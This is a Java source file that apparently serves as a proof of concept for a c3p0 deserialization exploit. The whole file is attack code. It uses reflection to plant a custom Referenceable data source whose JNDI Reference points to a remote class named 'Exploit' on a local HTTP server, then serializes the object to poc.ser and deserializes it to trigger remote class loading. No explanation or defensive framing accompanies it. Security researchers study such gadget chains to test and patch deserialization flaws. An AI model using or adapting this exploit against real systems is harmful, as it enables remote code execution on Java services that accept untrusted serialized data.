import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class GenC3P0 {

    public static void main(String[] args) throws Exception{
        GenC3P0 genC3P0 = new GenC3P0();
        genC3P0.serial();
        genC3P0.unserial();
    }

    public void serial() throws Exception{
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Field connectionPoolDataSource = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
        connectionPoolDataSource.setAccessible(true);
        connectionPoolDataSource.set(poolBackedDataSourceBase,new CPDS());

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("poc.ser"));
        objectOutputStream.writeObject(poolBackedDataSourceBase);
    }
    public void unserial() throws Exception{
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("poc.ser"));
        objectInputStream.readObject();
    }
    public class CPDS implements ConnectionPoolDataSource, Referenceable {

        @Override
        public Reference getReference() throws NamingException {
            return new Reference("Exploit", "Exploit", "http://127.0.0.1:8000/");
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
}
